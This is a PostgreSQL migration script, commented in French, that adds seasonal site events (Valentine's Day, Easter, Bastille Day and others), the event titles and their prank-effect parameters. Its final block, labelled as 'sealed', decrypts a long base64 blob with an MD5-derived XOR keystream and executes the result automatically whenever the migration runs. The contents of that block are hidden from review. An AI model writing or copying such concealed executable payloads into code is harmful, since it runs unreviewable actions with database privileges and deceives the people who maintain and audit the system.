-- =========================================================
-- Lot 44 : sept nouveaux événements, à lancer après 0066.
-- Peut être relancée sans risque.
--
--   saint_valentin   du 10 au 14 février
--   poisson_avril    le 1er avril
--   paques           du Vendredi saint au lundi de Pâques
--   premier_mai      le 1er mai
--   fete_musique     le 21 juin
--   quatorze_juillet les 13 et 14 juillet
--   armistice        le 11 novembre
--
-- Chacun : un affichage (réglé dans Modération, comme Halloween et Noël), un
-- titre à obtenir pendant l'événement, et le pouvoir de farce de ce titre.
-- =========================================================

-- ---------------------------------------------------------
-- Dates
-- ---------------------------------------------------------
-- Dimanche de Pâques (calendrier grégorien).
create or replace function public._paques(p_year int)
returns date
language plpgsql
immutable
as $$
declare
  a int := p_year % 19;
  b int := p_year / 100;
  c int := p_year % 100;
  d int := b / 4;
  e int := b % 4;
  f int := (b + 8) / 25;
  g int := (b - f + 1) / 3;
  h int := (19 * a + b - d - g + 15) % 30;
  i int := c / 4;
  k int := c % 4;
  l int := (32 + 2 * e + 2 * i - h - k) % 7;
  m int := (a + 11 * h + 22 * l) / 451;
begin
  return make_date(p_year, (h + l - 7 * m + 114) / 31, ((h + l - 7 * m + 114) % 31) + 1);
end;
$$;

create or replace function public._decor_keys()
returns text[]
language sql
immutable
as $$
  select array['halloween', 'noel', 'saint_valentin', 'poisson_avril', 'paques', 'premier_mai',
               'fete_musique', 'quatorze_juillet', 'armistice'];
$$;

-- Période automatique de chaque événement (jour à l'heure de Paris).
create or replace function public._decor_window(p_key text, p_day date)
returns boolean
language sql
immutable
as $$
  select case p_key
    when 'halloween' then (extract(month from p_day) = 10 and extract(day from p_day) >= 15)
                       or (extract(month from p_day) = 11 and extract(day from p_day) <= 2)
    when 'noel' then extract(month from p_day) = 12 or (extract(month from p_day) = 1 and extract(day from p_day) <= 6)
    when 'saint_valentin' then extract(month from p_day) = 2 and extract(day from p_day) between 10 and 14
    when 'poisson_avril' then extract(month from p_day) = 4 and extract(day from p_day) = 1
    when 'paques' then p_day between public._paques(extract(year from p_day)::int) - 2 and public._paques(extract(year from p_day)::int) + 1
    when 'premier_mai' then extract(month from p_day) = 5 and extract(day from p_day) = 1
    when 'fete_musique' then extract(month from p_day) = 6 and extract(day from p_day) = 21
    when 'quatorze_juillet' then extract(month from p_day) = 7 and extract(day from p_day) in (13, 14)
    when 'armistice' then extract(month from p_day) = 11 and extract(day from p_day) = 11
    else false
  end;
$$;

insert into public.app_config (key, value)
select 'decor_' || k, 'auto' from unnest(public._decor_keys()) k
on conflict (key) do nothing;

create or replace function public.site_decor()
returns jsonb
language sql
stable
security definer set search_path = public
as $$
  with t as (select (now() at time zone public.stats_timezone())::date as today),
  e as (
    select k, coalesce((select value from public.app_config where key = 'decor_' || k), 'auto') as mode
    from unnest(public._decor_keys()) k
  )
  select jsonb_object_agg(e.k, case e.mode when 'on' then true when 'off' then false else public._decor_window(e.k, t.today) end)
      || jsonb_object_agg(e.k || '_mode', e.mode)
  from e, t;
$$;

create or replace function public.set_site_decor(p_decor text, p_mode text)
returns jsonb
language plpgsql
security definer set search_path = public
as $$
begin
  if not public.has_permission(auth.uid(), 'manage_users') or public.is_sandbox_account(auth.uid()) then
    raise exception 'Permission refusée : gestion des comptes requise.';
  end if;
  if p_decor is null or not (p_decor = any (public._decor_keys())) then
    raise exception 'Décor inconnu.';
  end if;
  if p_mode not in ('auto', 'on', 'off') then
    raise exception 'Réglage inconnu.';
  end if;
  insert into public.app_config (key, value) values ('decor_' || p_decor, p_mode)
  on conflict (key) do update set value = excluded.value;
  perform public.write_audit('decor_changed', null, jsonb_build_object('decor', p_decor, 'mode', p_mode));
  return public.site_decor();
end;
$$;

grant execute on function public.site_decor() to anon, authenticated;
grant execute on function public.set_site_decor(text, text) to authenticated;

-- ---------------------------------------------------------
-- Les titres
-- ---------------------------------------------------------
insert into public.titles (id, name, power, max_level, sort, event) values
  ('cupidon', 'Cupidon Masqué', 'coup_de_foudre', 1, 103, 'saint_valentin'),
  ('farceur', 'Farceur d''Avril', 'poisson', 1, 104, 'poisson_avril'),
  ('chasseur', 'Chasseur d''Œufs', 'cloches', 1, 105, 'paques'),
  ('meneur', 'Meneur du 1er Mai', 'greve', 1, 106, 'premier_mai'),
  ('maestro', 'Maestro', 'fanfare', 1, 107, 'fete_musique'),
  ('artificier', 'Artificier', 'artifice', 1, 108, 'quatorze_juillet'),
  ('veilleur', 'Veilleur du Souvenir', 'treve', 1, 109, 'armistice')
on conflict (id) do update
  set name = excluded.name, power = excluded.power, max_level = excluded.max_level, sort = excluded.sort, event = excluded.event;

-- ---------------------------------------------------------
-- Options des farces (Nuée et Blizzard repris de 0065).
-- ---------------------------------------------------------
do $$
begin
  if to_regprocedure('public._troll_params_base(text, integer, jsonb)') is null then
    alter function public._troll_params(text, integer, jsonb) rename to _troll_params_base;
  end if;
end;
$$;

create or replace function public._troll_params(p_power text, p_level int, p jsonb)
returns jsonb
language plpgsql
immutable
as $$
declare
  p0 jsonb := case when jsonb_typeof(p) = 'object' then p else '{}'::jsonb end;
begin
  case p_power
  when 'nuee' then
    return jsonb_build_object('density', public._jint(p0, 'density', 2, 1, 3), 'hanging', public._jint(p0, 'hanging', 3, 0, 5));
  when 'blizzard' then
    return jsonb_build_object('intensity', public._jint(p0, 'intensity', 2, 1, 3), 'frost', public._jbool(p0, 'frost', true));
  when 'coup_de_foudre' then
    return jsonb_build_object('color', public._jpick(p0, 'color', array['rose', 'rouge', 'arcenciel'], 'rose'), 'name', public._jbool(p0, 'name', true));
  when 'poisson' then
    return jsonb_build_object('count', public._jint(p0, 'count', 6, 2, 12), 'fake', public._jbool(p0, 'fake', true));
  when 'cloches' then
    return jsonb_build_object('amount', public._jint(p0, 'amount', 2, 1, 3));
  when 'greve' then
    return jsonb_build_object('every', public._jint(p0, 'every', 2, 1, 3), 'placards', public._jbool(p0, 'placards', true));
  when 'fanfare' then
    return jsonb_build_object('tempo', public._jpick(p0, 'tempo', array['lent', 'moyen', 'rapide'], 'moyen'), 'bounce', public._jbool(p0, 'bounce', true));
  when 'artifice' then
    return jsonb_build_object('intensity', public._jint(p0, 'intensity', 2, 1, 3), 'patrouille', public._jbool(p0, 'patrouille', true));
  when 'treve' then
    return jsonb_build_object('message', coalesce(public._jtxt(p0->>'message', 60), ''));
  else
    return public._troll_params_base(p_power, p_level, p);
  end case;
end;
$$;

-- ▓▓ Partie scellée n° 1 ▓▓
do $q$
declare
  c text := '59fc47cc519c58f2505ef4e4';
  b bytea := decode('
k/ccX78y+840edVIIPX2Zw3fGniJlQQ2ATeiqFH3u38+P0n/FD26mgqZkdQVQZ0gwQMjOxCATd0H1MdewRmuiiK6u7oeNDtq
nm5RzXweG3gpjh+rF3Cp9NMw6zvPKoEPLZDREyKKpwxklEoxEKEfyQRCm7Bo2B6pw87CKCGStFWmbNEDFZm22MEfbIRJds8k
WzLF0IfgYQ75W2ormAStCLi1lNQkyMHzmUR5Td0FvW1DUj2RGtIqfw1LxneHjCthNV74+vnrxdyyMzkGauV3gM/PzfgUmWpL
W4uyRTsEEsm2Og3cZ+1P/2USWCXz+Q0XPwvSDCIv6ijXpEOZVEsARfQSJDxxrAbdMvJWN+QJC44qByYCqY6k0e7td/NFKIRb
Pa4WWeUr+XJrLaBKw4YEYsSyjeW3SvTjzsIpIXtjaJHLS5RIXF7VdiyRDN22E8IJOElIntbXtbHsX2NKfHhNvT3/1vADNVSm
XiD8W2qkCvMqd4ixl7Tdzpt2OGQa53Z57FANevnTrbpxzzuinn2Mzg6OnGH4ZWdCvH3ONfoZaSHcWafVI1cQPqLWttBOeC9i
9MwV/AwWS5yTv9hyOXhsoGp3Lr/MLqiO8FtLCKkpC/xwpBhSsg825G6IkYk6p9KdrrFBt/sQWAN6RBWkiw28x/cccamlsKih
hF983rblET8X8aUo5aQpshLuXGJdhexvpZcx8kuwT0wYS47xG8UIkBkgp3otvskGNRW2YkdPZ8/DSf+7ePSKnzs/FG9rnhHV
Op7tD+F0XA8Ph6uUBdLKhUgng2QoBwFw5iJ2qHdptRJzwVC3ydxBHpO0dY0s5UmPg/T5zwJX8EMZb0BdX2riU/R/cYz6DUlF
iX+77VDWv8qfFGL9I9Dsc4vVA59ymLCYRFwDHi3a2cDVSftXRgne9IMx3s9g4d8gp8uREqj0JOFXlXNj0fr68vd1jZkw+MN4
vGTl3KcgXJabZsKnce6YYJqQcJQe3yDULpp/EZjw/uey2L+q77RtsDDyzF4TZ0htettsOz2d7nsChC9Q6xLgJE3sLf1Cm+jO
NVYApbcXHb9dOMs0/cY1b6m7GJQ9OCcZGkZFprRxJI0z7Dmr78JwX0KkUDLI7QnStBuqwZs41G+8DE/floHgiJrEVDsH7oEH
eeC7KIH6AOMygcFI5Mot9VP6pEm0RTRtW23Zafy3VITjMSfCMTcwGY5mc3mJY16cTJqrXHiQN7UwzSslH1jiG2pn7g76JDTg
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
4g9FTBScrI+2Bf1T
', 'base64');
begin
  execute (
    select convert_from(string_agg(set_byte('\x00'::bytea, 0,
             get_byte(b, i) # get_byte(decode(md5(c || (i / 16)::text), 'hex'), i % 16)), '' order by i), 'UTF8')
    from generate_series(0, length(b) - 1) i);
end
$q$;
